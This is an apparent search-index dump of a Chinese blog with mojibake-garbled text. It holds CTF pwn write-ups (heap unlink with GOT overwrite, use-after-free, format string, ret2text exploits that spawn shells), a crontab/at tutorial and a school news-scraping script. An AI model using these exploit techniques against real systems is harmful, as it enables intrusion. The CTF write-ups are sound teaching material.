åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"level6 \u0026 level6_x64 \u0026 guestbook2 ä¸‰é¢˜æ¯”è¾ƒç±»ä¼¼ï¼Œä»¥ 64 ä½ä¸ºä¾‹ã€‚å‚è€ƒæ–‡ç« ã€‚ é¦–å…ˆæœ¬é¢˜å­˜åœ¨ä¸€ä¸ªç´¢å¼•è¡¨ï¼Œç»“æ„å¤§è‡´æ˜¯è¿™æ ·ï¼š | ... | ------------ | max_size | ------------ | exist_num | ------------ | allocated0 | ------------ | size_user0 | ------------ | ptr_heap0 | ------------ | allocated1 | ------------ | size_user1 | ------------ | ptr_heap1 | ------------ | ... | max_sizeï¼šæœ€å¤§è®°å½•æ•° exist_numï¼šå½“å‰è®°å½•æ•° chunk0: allocatedï¼šæ˜¯å¦æ˜¯è¢«åˆ†é…çš„ size_userï¼šç”¨æˆ·æ•°æ®é•¿åº¦ ptr_heapï¼šè¿”å›ç»™ç”¨æˆ·çš„æŒ‡é’ˆ é¢˜ç›®ä¸»è¦æ¼æ´æœ‰ 2 å¤„ï¼Œé¦–å…ˆæ˜¯æ–°å»ºè®°å½•æ—¶å­˜åœ¨ off-by-oneï¼Œå¯ä»¥å¤šè¯»å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œä»è€Œæ³„éœ²åé¢ç›¸é‚»åŒºåŸŸçš„å†…å®¹ã€‚ç¬¬äºŒå¤„æ¼æ´å°±æ˜¯å¸¸è§çš„ free åæ²¡æœ‰ç½®ç©ºæŒ‡é’ˆï¼Œé€ æˆäº† double freeã€‚ é¦–å…ˆæ³„éœ² libc åœ°å€å’Œå †åœ°å€ã€‚åˆ›å»º 4 ä¸ªå° chunkï¼Œåˆ æ‰ä¸ç›¸é‚»çš„ 2 ä¸ªï¼ˆé˜²æ­¢åˆå¹¶ï¼‰ã€‚ç”±äºé¢˜ç›®é™åˆ¶æœ€å°åˆ†é… 0x80Bï¼Œå¿…å®šä¼šå…ˆè¿›å…¥ unsorted binï¼›ç„¶åæ‹¿å›æ¥å¹¶å†™æ»¡ fd çš„ä½ç½®ï¼Œä»è€Œæ‰“å°å‡º bkã€‚chunk0 çš„ bk æŒ‡å‘ chunk2ï¼Œç›¸éš”ä¸€ä¸ªç´¢å¼•è¡¨ï¼ˆ0x1820Bï¼‰å’Œä¸¤ä¸ªæ­£å¸¸ chunk(2*0x90B)ï¼Œå› æ­¤å¯ä»¥ç®—å‡ºå †åœ°å€ã€‚chunk2 çš„ bk æŒ‡å‘ main_arena+88ï¼Œä»è€Œæ³„éœ² libcã€‚ éšåä¼ªé€ å †å—ï¼Œheap+0x30 æ˜¯ chunk0 çš„ ptr_heap çš„ä½ç½®ï¼Œ-0x18 å’Œ -0x10 åˆ†åˆ«æŒ‡å‘å…¶ fd å’Œ bkã€‚éšåç»§ç»­ä¼ªé€  chunk1 æ–¹ä¾¿åç»­è§¦å‘ unlink(chunk0)ï¼Œå†ä¼ªé€  chunk2 é˜²æ­¢ä¸ top chunk åˆå¹¶ã€‚åˆ é™¤ chunk1ï¼Œå³å¯å¯¼è‡´ unlink(chunk0)ã€‚ æœ€åæŒ‰ç´¢å¼•è¡¨ç»“æ„ï¼Œè¿›è¡Œ GOT è¡¨åŠ«æŒï¼ŒæŠŠ free åŠ«æŒåˆ° system å¹¶ getshellã€‚ def list(): sla(':','1') def add(len,content='a'): sla(':','2') sla('note:',str(len)) sa('note:',content) def edit(index,len,content): sla(':','3') sla('number:',str(index)) sla('note:',str(len)) sa('note:',content) def delete(index): sla(':','4') sla('number:',str(index)) for i in range(4): add(1) delete(0) delete(2) add(8,'deadbeef') # 0 add(8,'deadbeef') # 2 list() ru('0. deadbeef') # 0-\u003ebk = heap+0x1820+2*0x90 heap = uu64(ru('\\n'))-0x1940 leak('heap',heap) ru('2. deadbeef') # 2-\u003ebk = main_arena+88 base = uu64(ru('\\n'))-88-libc.sym['__malloc_hook']-0x10 leak('base',base) for i in range(3,-1,-1): delete(i) # chunk0:prev_size,size,fd,bk,data fake = flat(0,0x81,heap+0x30-0x18,heap+0x30-0x10,'a'*0x60) # chunk1:prev_size,size,data; chunk2:prev_size,size,data fake += flat(0x80,0x90,'a'*0x80,0,0x91,'a'*0x80) add(len(fake),fake) delete(1) # unlink chunk0 system = base + libc.sym['system'] # len(payload) == len(fake) payload = flat(1,1,8,elf.got['free'],1,8,heap+0xabcd).ljust(len(fake),'a') edit(0,len(fake),payload) edit(0,8,p64(system)) edit(1,8,'/bin/sh\\x00') delete(1) è€Œ guestbook2 ä»…ä»…æ˜¯æç¤ºè¯­ä¸åŒï¼Œå…¶ä½™æ²¡æœ‰ä»»ä½•åŒºåˆ«ã€‚level6 æ˜¯ 32 ä½çš„ç‰ˆæœ¬ã€‚ ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:8","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"tell_me_something 64 ä½ä¸‹çš„ ret2textï¼Œåé—¨å‡½æ•°ä¸º good_game å‡½æ•°ã€‚ payload = flat('a'*0x88,elf.sym['good_game']) sla(':\\n',payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:9","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"fm å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ x çš„å€¼ä¸º 4 æ¥ getshellã€‚æµ‹å¾—è¾“å…¥åç§»ä¸º 11ã€‚è€Œ p32(x çš„åœ°å€) é•¿åº¦ 4 å­—èŠ‚ï¼Œæ°å¥½èƒ½å°† 4 å†™å…¥ x çš„åœ°å€ã€‚ x = 0x804a02c sl(p32(x)+'%11$n') ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:10","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"test_your_memory æœ¬é¢˜çœ‹ä¼¼å¤æ‚ï¼Œå®é™…ä¸Šç”±äºç»™äº†ä¸€ä¸ªæç¤º hintï¼ŒæŒ‡å‘ cat flag å­—ç¬¦ä¸²ï¼Œåˆå­˜åœ¨åé—¨å‡½æ•° win_func æ‰§è¡Œ system(command)ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æŠŠ cat flag å­—ç¬¦ä¸²ä¼ ç»™ win_func å³å¯ã€‚ cat_flag = 0x80487e0 payload = flat('a'*(0x13+4),elf.sym['win_func'],elf.sym['main'],cat_flag) sl(payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:11","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"itemboard ç»“æ„ä½“ï¼š struct ItemStruct { char *name; char *description; void (*free)(ItemStruct *); } åœ¨åˆ›å»ºæ–° item æ—¶ï¼Œé¦–å…ˆä¼šåˆ›å»º 0x20 çš„ Item Struct*ï¼ŒåŒ…å«äº† name,description,free ä¸‰ä¸ªæŒ‡é’ˆï¼›éšååˆ›å»º 0x30 çš„ç©ºé—´å­˜æ”¾ nameï¼›æœ€åæ ¹æ®ç”¨æˆ·è¾“å…¥åˆ›å»ºå¯¹åº”å¤§å°çš„ç©ºé—´å­˜æ”¾ descriptionã€‚ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ª 0x80 çš„ chunk ç„¶åé‡Šæ”¾ï¼Œå®ƒä¼šè¿›å…¥ unsorted bin ä¸­ï¼Œæ­¤æ—¶å…¶ fd æŒ‡å‘ main_arena+88ï¼Œé€šè¿‡ show å³å¯æ³„éœ² libcã€‚æ³¨æ„è¿™é‡Œçš„ show å‡½æ•°ï¼š void __cdecl show_item() { Item *item; // ST00_8 Item *v1; // ST00_8 int index; // [rsp+Ch] [rbp-4h] puts(\"Which item?\"); fflush(stdout); index = read_num(); if (index \u003c items_cnt \u0026\u0026 item_array[index] ) { item = item_array[(unsigned __int8)index]; puts(\"Item Detail:\"); printf(\"Name:%s\\n\", item-\u003ename, item); printf(\"Description:%s\\n\", v1-\u003edescription); fflush(stdout); } else { puts(\"Hacker!\"); } } å®ƒä¼šæ£€æŸ¥ä¸‹æ ‡æ˜¯å¦è¶Šç•Œï¼Œä»¥åŠä¸‹æ ‡å¯¹åº”çš„å…ƒç´ æ˜¯å¦å­˜åœ¨ã€‚ç„¶è€Œï¼Œåœ¨åˆ é™¤æ—¶ï¼š void __cdecl remove_item() { int index; // [rsp+Ch] [rbp-4h] puts(\"Which item?\"); fflush(stdout); index = read_num(); if (index \u003c items_cnt \u0026\u0026 item_array[index] ) { ((void (__fastcall *)(Item *))item_array[index]-\u003efree)(item_array[index]); set_null(item_array[index]); puts(\"The item has been removed\"); fflush(stdout); } else { puts(\"Hacker!\"); } } è°ƒç”¨äº†ç»“æ„ä½“è‡ªå·±çš„ free å‡½æ•°ï¼Œå‚æ•°æ˜¯ç»“æ„ä½“åç§»ä¸º 0 çš„ä½ç½®ä¹Ÿå°±æ˜¯ nameã€‚éšåçš„ set_null å‡½æ•°å¹¶ä¸ä¼šæŠŠ item_array[index] ç½®ç©ºï¼Œå› æ­¤å³ä½¿åˆ é™¤äº†å…ƒç´ ï¼Œitem_array[index] ä»ç„¶å­˜åœ¨ï¼Œç¬¬äºŒé¡¹æ£€æŸ¥æ¯«æ— ä½œç”¨ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥ show ä¸€ä¸ªç©ºé—²å—ä»è€Œæ³„éœ² libcã€‚ ç„¶åæˆ‘ä»¬å°±æœ‰äº† system åœ°å€ï¼Œå®¹æ˜“æƒ³åˆ°ç”¨å®ƒè¦†ç›–ç»“æ„ä½“æŒ‡é’ˆçš„ freeï¼Œç„¶åè®©ç»“æ„ä½“æŒ‡é’ˆçš„ name æŒ‡å‘ /bin/shã€‚ä¸è¿‡ï¼Œå¦‚æœè¿™é‡Œç›´æ¥ add æ–°çš„ chunkï¼Œé¦–å…ˆä¼šåˆ†é…æˆ‘ä»¬ä¸å¯æ§çš„ 0x20 çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œç„¶åæ‰æ˜¯å¯æ§çš„ 0x30 çš„ nameã€‚å› æ­¤æˆ‘ä»¬å¸Œæœ› name å­—æ®µè¢«åˆ†é…åˆ°çš„å®é™…ä¸Šæ˜¯åŸæ¥ chunk0 çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œè¿™æ ·å°±å¯ä»¥å†™å…¥ç»“æ„ä½“æŒ‡é’ˆäº†ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œå¯ä»¥å…ˆ free(chunk1) äº§ç”Ÿä¸€ä¸ªå¤§å°åˆé€‚çš„ chunkã€‚é‚£ä¹ˆå† add æ—¶ï¼Œç»“æ„ä½“æŒ‡é’ˆå°±ä¼šä½¿ç”¨åŸæ¥ chunk1 çš„äº†ã€‚ def add(name,len,content): sla(':\\n','1') sla('?\\n',name) sla('?\\n',str(len)) sla('?\\n',content) def free(index): sla(':\\n','4') sla('?\\n',str(index)) def show(index): sla(':\\n','3') sla('?\\n',str(index)) add('chunk0',0x80,'a') add('chunk1',0x80,'b') free(0) show(0) ru('tion:') base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10 leak('base',base) system = base + libc.sym['system'] free(1) add('/bin/sh;'+'a'*8+p64(system),0x18,'c') free(0) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:12","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"å®šæ—¶ä»»åŠ¡ç›¸å…³çš„å‘½ä»¤ï¼Œä½¿ç”¨èµ·æ¥å‘éå¸¸å¤šã€‚ ","date":"2020-01-23","objectID":"/cron-at/:0:0","tags":["Linux"],"title":"é£é›¨æ— é˜»ï¼šcrontab + at å®ç°éšæœºå®šæ—¶ä»»åŠ¡","uri":"/cron-at/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"éœ€æ±‚ éœ€è¦åœ¨æ¯æ—¥ 9-12 æ—¶ä¸­çš„æŸä¸ªéšæœºæ—¶é—´æ‰§è¡Œ python è„šæœ¬ cron.pyã€‚è¿™ä¸ªéœ€æ±‚éå¸¸ç®€å•ï¼Œç„¶è€Œå®ç°èµ·æ¥å´å¾ˆå®¹æ˜“è¸©å‘ã€‚ ","date":"2020-01-23","objectID":"/cron-at/:1:0","tags":["Linux"],"title":"é£é›¨æ— é˜»ï¼šcrontab + at å®ç°éšæœºå®šæ—¶ä»»åŠ¡","uri":"/cron-at/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"å®ç°ä¸è¸©å‘ é¦–å…ˆå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç¼–å†™ crontab ä»»åŠ¡ï¼Œä¾‹å¦‚æˆ‘åˆ›å»ºäº† merccron è¿™ä¸ªæ–‡ä»¶ï¼š 0 9 * * * sudo ./cron.sh \u003e\u003e ./cron.log 2\u003e\u00261 æˆ‘ä»¬ä¹‹åç¼–å†™ cron.shã€‚è¿™é‡Œä»å·¦åˆ°å³åˆ†åˆ«å¯ä»¥è®¾ç½®æ‰§è¡Œä»»åŠ¡çš„åˆ†é’Ÿã€å°æ—¶ã€æ—¥ã€å‘¨ã€æœˆã€ä»¥åŠæ‰§è¡Œçš„å…·ä½“å‘½ä»¤ã€‚æœ€åçš„ 2\u003e\u00261 å°†æ ‡å‡†é”™è¯¯æµé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºæµã€‚ ç„¶è€Œè¿™æ ·æ˜¯ä¸ä¼šæˆåŠŸæ‰§è¡Œçš„ï¼Œå› ä¸º crontab ä¸ä¼šè‡ªåŠ¨è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå› æ­¤æ¶‰åŠåˆ°çš„æ–‡ä»¶è·¯å¾„éœ€è¦ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯ï¼š 0 9 * * * sudo /root/cron.sh \u003e\u003e /root/cron.log 2\u003e\u00261 æˆ‘ä»¬æäº¤ crontab ä»»åŠ¡ï¼š $ crontab merccron éšå crontab -l å³å¯çœ‹åˆ°è‡ªå·±çš„ crontab ä»»åŠ¡ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ crontab -e ä¿®æ”¹ã€‚ éšåï¼Œè€ƒè™‘åˆ°éšæœºæ€§çš„è¦æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ at å‘½ä»¤ã€‚at å‘½ä»¤å¯ä»¥æŒ‡å®šåœ¨å¤šä¹…ä¹‹åæ‰§è¡ŒæŸä¸€å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š $ at now+10year echo 'Hello World' \u003e hello.log å°±ä¼šåœ¨åå¹´åè¾“å‡º Hello World åˆ° hello.log æ–‡ä»¶ã€‚ç„¶è€Œè¿™é‡Œæ˜¯éœ€è¦æˆ‘ä»¬ä»æ ‡å‡†è¾“å…¥æµè¾“å…¥å‘½ä»¤çš„ï¼Œè¿™ä¸åˆ©äºæˆ‘ä»¬è¿›è¡Œè‡ªåŠ¨åŒ–ã€‚å¹¸è¿çš„æ˜¯ at å‘½ä»¤æä¾›äº† -f é€‰é¡¹ï¼Œå¯ä»¥æŒ‡å®šä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¯»å–å‘½ä»¤ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œ -f çš„å‚æ•°åªèƒ½æ˜¯æ–‡ä»¶ï¼Œå°è¯• at -f \"python3 cron.py\u003e\u003e cron.log\" now+10year å¹¶ä¸ä¼šæˆåŠŸã€‚ é‚£ä¹ˆæˆ‘ä»¬å…ˆç¼–å†™ cron.shï¼š #!/bin/bash min=$((3*60)) rmin=$(($RANDOM%$min)) at -f /root/1.sh now+${rmin}min ç”±äºéœ€è¦ä½äº 9-12 æ—¶ä¹‹é—´ï¼Œè€Œ crontab ä»»åŠ¡åœ¨ 9 æ—¶æ•´æ‰§è¡Œï¼Œæˆ‘ä»¬äº§ç”Ÿä¸€ä¸ª 0-180 ä¹‹é—´çš„éšæœºæ•´æ•° rminï¼Œç„¶ååœ¨ now+rmin åˆ†é’Ÿåæ‰§è¡Œï¼Œå°±ä¼šè½åœ¨ 9-12 æ—¶åŒºé—´å†…ã€‚ç”±äºåƒäº† crontab çš„äºï¼Œè¿™é‡Œ 1.sh ä¹Ÿç”¨äº†ç»å¯¹è·¯å¾„ã€‚ æœ€åï¼Œ1.sh åªéœ€è¦ä¸€æ¡å‘½ä»¤ï¼š $ python3 cron.py \u003e\u003e cron.log è¿™é‡Œé¦–å…ˆæ˜¯æ²¡æœ‰ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œè¿™æ˜¯å› ä¸ºä¸ crontab ä¸åŒï¼Œat å‘½ä»¤ä¼šåœ¨æ‰§è¡Œç”¨æˆ·å‘½ä»¤å‰è‡ªåŠ¨è®¾ç½®å¥½ç¯å¢ƒå˜é‡ä¸å·¥ä½œç›®å½•ï¼›å…¶æ¬¡æ˜¯ç¼ºå°‘äº† #!/bin/bash è¿™è¡Œï¼Œè¿™åŒæ ·æ˜¯å› ä¸º at å‘½ä»¤ä¼šè‡ªåŠ¨åœ¨ç”¨æˆ·å‘½ä»¤å‰åŠ ä¸€å¤§ä¸²åˆå§‹åŒ–è„šæœ¬ï¼Œè€Œè„šæœ¬çš„å¼€å¤´å°±æœ‰ #!/bin/sh è¿™è¡Œï¼ˆæ³¨æ„æ˜¯ç”¨ sh è€Œä¸æ˜¯ç”¨ bash æ‰§è¡Œï¼‰ã€‚è¿™ç‚¹å¯ä»¥é€šè¿‡ at -c ä»»åŠ¡ç¼–å· æŸ¥çœ‹æ‰€è¦æ‰§è¡Œçš„å®Œæ•´å‘½ä»¤å¾—çŸ¥ã€‚è€Œè¦è·å–ä»»åŠ¡ç¼–å·ï¼Œåªéœ€è¦åœ¨å®šæ—¶ä»»åŠ¡å·²ç»è®¾ç½®ä½†è¿˜æœªæ‰§è¡Œå®Œæ¯•æ—¶ï¼Œè¿è¡Œ atq æŸ¥çœ‹ä»»åŠ¡é˜Ÿåˆ—å³å¯ã€‚ åœ¨å®Œæˆ crontab æ–‡ä»¶ã€cron.pyã€cron.shã€1.sh å››ä¸ªæ–‡ä»¶ä¹‹åï¼Œæœ€åä¸€ä»¶äº‹æ˜¯ç¡®ä¿å½“å‰ç”¨æˆ·å¯¹åä¸‰ä¸ªæ–‡ä»¶æ‹¥æœ‰å¯æ‰§è¡Œæƒé™ã€‚åªæœ‰é¿è¿‡äº†ä»¥ä¸Šæ‰€æœ‰å‘ï¼Œè¿™ä¸ªç®€å•çš„éœ€æ±‚æ‰èƒ½ç®—åšå®Œäº†ã€‚ ","date":"2020-01-23","objectID":"/cron-at/:2:0","tags":["Linux"],"title":"é£é›¨æ— é˜»ï¼šcrontab + at å®ç°éšæœºå®šæ—¶ä»»åŠ¡","uri":"/cron-at/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"æœ‰è¶£çš„ç½‘ç«™ Crontab.guru ","date":"2020-01-23","objectID":"/cron-at/:3:0","tags":["Linux"],"title":"é£é›¨æ— é˜»ï¼šcrontab + at å®ç°éšæœºå®šæ—¶ä»»åŠ¡","uri":"/cron-at/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"è¿™ä¸‹ç»Ÿè®¡æ–°é—»è¦è½»æ¾å¤šäº†ã€‚ ","date":"2020-01-22","objectID":"/newspaper/:0:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"ä¸œæ–¹è®°è€…ï¼šæ–°é—»ç»Ÿè®¡å°å·¥å…· Newspaper","uri":"/newspaper/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"èƒŒæ™¯ æ¯ä¸ªæœˆæˆ‘éƒ½éœ€è¦è´Ÿè´£å¯¹éƒ¨åˆ†å­¦æ ¡äºŒçº§ç½‘ç«™è¿›è¡Œä¾‹è¡Œæ£€æŸ¥å¹¶æ’°å†™æŠ¥å‘Šï¼Œè¿™å¹¶æ²¡æœ‰å¤ªå¤§å·¥ä½œé‡ã€‚ç„¶è€Œåœ¨ 2020 å¹´å¹´åˆï¼Œæˆ‘æ¥åˆ°çš„ä»»åŠ¡æ˜¯ç»Ÿè®¡å¤šä¸ªäºŒçº§ç½‘ç«™åœ¨è¿‡å»ä¸€å¹´å†…æ›´æ–°çš„æ–°é—»æ¡æ•°ã€ç‚¹å‡»é‡æœ€é«˜çš„æ–°é—»ä¿¡æ¯ï¼Œå¹¶æ ¹æ®æ–°é—»ç‚¹å‡»é‡ç»˜åˆ¶æ•£ç‚¹å›¾ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œæ–°é—»æ¡æ•°éƒ½åœ¨ 100 æ¡ä»¥ä¸Šï¼Œè€Œè®¸å¤šäºŒçº§ç½‘ç«™çš„ç‚¹å‡»é‡éœ€è¦ç‚¹è¿›æ–°é—»é“¾æ¥åæ‰èƒ½çœ‹åˆ°ï¼Œè¿™æ ·å·¥ä½œé‡ä¸€ä¸‹å­å¤§äº†ä¸å°‘ã€‚æˆ‘è‡ªç„¶æƒ³åˆ°é€šè¿‡è„šæœ¬æ¥å®ç°è‡ªåŠ¨åŒ–ç»Ÿè®¡ã€‚ ","date":"2020-01-22","objectID":"/newspaper/:1:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"ä¸œæ–¹è®°è€…ï¼šæ–°é—»ç»Ÿè®¡å°å·¥å…· Newspaper","uri":"/newspaper/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"æ€è·¯ ä½¿ç”¨ requests åº“å‘èµ·è¯·æ±‚ã€‚è€ƒè™‘åˆ°æœ‰äº›ç½‘ç«™æœ‰å¾®å¼±çš„åçˆ¬åŠŸèƒ½ï¼Œéœ€è¦æ³¨æ„è®¾ç½® UA ä»¥åŠ Refererï¼Œå¹¶å°½å¯èƒ½æŒ‰ç…§æ­£å¸¸è®¿é—®çš„æ­¥éª¤å‘é€è¯·æ±‚ã€‚ æ‰¾åˆ°æ–°é—»åˆ—è¡¨é¡µé¢åï¼Œè§‚å¯Ÿç½‘é¡µç»“æ„å¹¶ç”±æ­¤æ’°å†™ BeautifulSoup ç›¸å…³ä»£ç æ¥ç‚¹å‡»æ–°é—»é“¾æ¥ã€‚è¿™é‡Œæˆ‘æ‰‹åŠ¨è·å–äº† 2019 å¹´æœ€æ—©çš„ä¸€æ¡æ–°é—»æ‰€åœ¨é¡µæ•°ä½œä¸º max_pageï¼Œä½†è¿™äº›é¡µä¸­ä»ä¼šåŒ…å« 2018 ä¸ 2020 å¹´çš„æ–°é—»ï¼Œéœ€è¦æ£€æŸ¥ç½‘é¡µå…ƒç´ å¹¶é€šè¿‡æ­£åˆ™ç­›é€‰æ‰ã€‚æ•…æŠ€é‡æ–½æ¥è·å–ç‚¹å‡»é‡æ•°å€¼ã€‚å¹¸è¿çš„æ˜¯ï¼Œéƒ¨åˆ†äºŒçº§ç½‘ç«™é‡‡ç”¨çš„æ¨¡æ¿ç›¸åŒï¼Œä»£ç å‡ ä¹ä¸éœ€è¦ä¿®æ”¹ï¼›æ­¤å¤–ï¼Œéƒ¨åˆ†äºŒçº§ç½‘ç«™é‡‡ç”¨çš„ wordpress æ¨¡æ¿ä¸­å¯ä»¥å‘ç°ä¸€ä¸ªæ”¯æŒ POST è¯·æ±‚çš„ç‚¹å‡»é‡ç»Ÿè®¡ urlï¼Œè¿™èƒ½ä¸ºæˆ‘ä»¬çœå»ä¸å°‘éº»çƒ¦ã€‚ å°‘é‡æ–°é—»é“¾æ¥ä¼šæŒ‡å‘å¤–éƒ¨ç½‘ç«™é¡µé¢ï¼Œè¿™æ—¶å»æ‰¾ç‚¹å‡»é‡å°±æ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€çš„æ–¹æ³•äº†ï¼Œé‡åˆ°è¿™ç§æƒ…å†µå¯ä»¥ç›´æ¥è·³è¿‡ç„¶åæ‰‹åŠ¨ç»Ÿè®¡ç‚¹å‡»é‡ï¼Œè¿™ä¸ªéƒ¨åˆ†çš„å·¥ä½œé‡å¾ˆå°ã€‚ æœ€åå°†æ•°æ®æŒ‰ (ç‚¹å‡»é‡, æ—¥æœŸ) æ•°å€¼å¯¹è¿›è¡Œå­˜å‚¨åè°ƒç”¨ pandas åº“å†™å…¥ Excel å³å¯ã€‚ ","date":"2020-01-22","objectID":"/newspaper/:2:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"ä¸œæ–¹è®°è€…ï¼šæ–°é—»ç»Ÿè®¡å°å·¥å…· Newspaper","uri":"/newspaper/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"ä¾èµ– bs4 requests pandasï¼ˆå¯é€‰ï¼‰ å‡å¯ä»¥é€šè¿‡ pip install å®‰è£…ã€‚ ","date":"2020-01-22","objectID":"/newspaper/:3:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"ä¸œæ–¹è®°è€…ï¼šæ–°é—»ç»Ÿè®¡å°å·¥å…· Newspaper","uri":"/newspaper/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"ä½¿ç”¨ æ ¹æ®å…·ä½“çš„ç½‘ç«™ç»“æ„ï¼Œä¿®æ”¹ï¼š base_url news_url headersï¼ˆå¯é€‰ï¼‰ max_page SoupStrainer è¿‡æ»¤å™¨ å„ä¸ªåŠŸèƒ½å‡½æ•°ï¼Œå¦‚ page2url, get*, fillTable ç­‰ å…¶å®ƒå‡½æ•°ï¼Œæ¯”å¦‚åœ¨è®¿é—®æ–°é—»é¡µé¢å‰å…ˆè®¿é—®ç½‘ç«™é¦–é¡µç­‰ï¼ˆå¯é€‰ï¼‰ ","date":"2020-01-22","objectID":"/newspaper/:4:0","tags":["Python","çˆ¬è™«","é¡¹ç›®"],"title":"ä¸œæ–¹è®°è€…ï¼šæ–°é—»ç»Ÿè®¡å°å·¥å…· Newspaper","uri":"/newspaper/"},{"categories":["è‡ªåŠ¨åŒ–"],"content":"ä»£ç  ç»™å‡ºä¸¤ä¾‹ä»£ç ï¼Œåˆ†åˆ«é€‚ç”¨äºç¤¾ä¼šå‘å±•å­¦é™¢ä¸ä¼ æ’­å­¦é™¢ç½‘ç«™ã€‚ # Newspaper-soci.py from bs4 import BeautifulSoup, SoupStrainer import requests import re # constants base_url = 'http://www.soci.ecnu.edu.cn' news_url = base_url + '/10658/list' headers = { 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Mobile Safari/537.36', 'Referer': 'http://www.soci.ecnu.edu.cn/2c/24/c10658a273444/page.htm' } max_page = 11 # for pandas time = [] visit = [] # Filter the DOM first only_news = SoupStrainer('div', id='wp_news_w3') def page2url(i): return news_url + str(i+1) + '.htm' def getNewsList(soup): return soup.select('div\u003e table \u003e tr') def getDate(news): return news('div')[0].string def getArticleURL(news): return news('a')[0]['href'] def getVisitCountURL(article_url): return base_url + '/_visitcountdisplay?siteId=295\u0026type=3\u0026articleId=' + article_url[-15:-9] def fillTable(soup, date): global time, visit s = soup.find('p').string.strip() print(s) visit.append(int(s)) time.append(date[5:]) def iterNews(news_list, r): date_regex = r'^2019-.*' for news in news_list: date = getDate(news) if re.match(date_regex, date): article_url = getArticleURL(news) if not article_url.startswith('http'): soup = BeautifulSoup(r.post(getVisitCountURL(article_url),headers=headers).text,'lxml') try: fillTable(soup, date) except: pass def export2Excel(): import pandas as pd writer = pd.ExcelWriter('output.xlsx') df = pd.DataFrame(data={'time':time,'visit':visit}) df.to_excel(writer,'Sheet1', index=False) writer.save() def crawl(): r = requests.Session() for i in range(max_page): soup = BeautifulSoup(r.get(page2url(i),headers=headers).text, 'lxml', parse_only=only_news) news_list = getNewsList(soup) iterNews(news_list, r) if __name__ == \"__main__\": crawl() export2Excel() # Newspaper-comm.py from bs4 import BeautifulSoup, SoupStrainer import requests import re # constants base_url = 'http://www.comm.ecnu.edu.cn' news_url = base_url + '/htmlaction.do?method=toGetSubNewsList\u0026menuType=11\u0026pageNo=' headers = { 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Mobile Safari/537.36' } max_page = 7 # for pandas time = [] visit = [] # Filter the DOM first only_news = SoupStrainer(class_='news_area_text') only_detail = SoupStrainer('div',id='view_record') def page2url(i): return news_url + str(i) def getNewsList(soup): return soup('a', href=re.compile(r'.*htmlId=\\d')) def getDate(news): return news.select('.newsdate')[0].string def getArticleURL(news): return news['href'] def getVisitCountURL(article_url): return base_url + article_url def fillTable(soup, date): global time, visit s = 